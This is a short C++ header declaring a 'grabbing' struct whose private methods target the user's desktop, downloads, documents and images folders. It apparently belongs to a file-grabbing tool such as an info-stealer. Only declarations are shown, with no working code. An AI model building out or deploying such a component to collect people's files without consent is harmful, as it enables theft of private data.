#pragma once

#include "../../win.h"

struct grabbing {
public:
	void run();
private:
	void is_desktop(std::string path);
	void is_user_downloads(std::string path);
	void is_user_documents(std::string path);
	void is_user_images(std::string path);
};

extern grabbing g_grabbing;